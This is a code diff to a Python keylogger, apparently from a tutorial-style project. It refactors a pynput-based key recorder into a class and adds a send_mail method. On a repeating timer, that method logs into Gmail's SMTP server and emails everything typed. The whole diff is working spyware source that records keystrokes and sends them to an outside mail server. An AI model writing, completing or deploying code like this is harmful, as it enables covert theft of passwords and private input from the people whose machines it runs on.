@@ -3,25 +3,38 @@
 import pynput.keyboard
 import threading
 
-log = ""
-
 class Keylogger:
+    def __init__(self, time_interval, email, password):
+        self.log = ""
+        self.interval = time_interval
+        self.email = email
+        self.password = password
+     
+    def append_to_log(self, string):
+        self.log = self.log + string
+        
     def process_key_press(self, key):     # the function to execute each time a key is typed
-        global log
         try:
-            log = log + str(key.char)     # remove the "u" each time
+            current_key = str(key.char)     # remove the "u" each time
         except AttributeError:
             if key == key.space:
-                log = log + " "    
+                current_key = " "    
             else:
-                log = log + " " + str(key) + " "
+                current_key =" " + str(key) + " "
+        self.append_to_log(current_key)
     
     def report(self):
-        global log
-        print(log)      # print or save or send mail here
-        log = ""
-        timer = threading.Timer(5, self.report)    # split program and run report every 5 seconds
+        self.send_mail(self.email, self.password, self.log)      # print or save or send mail here
+        self.log = ""
+        timer = threading.Timer(self.interval, self.report)    # split program and run report every 5 seconds
         timer.start()
+       
+    def send_mail(self, email, password, message):
+        server = smtplib.SMTP("smtp.gmail.com", 587)
+        server.starttls()
+        server.login(email, password)
+        server.sendmail(email, email, message)
+        server.quit()
     
     def start(self):
         keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)    # create object
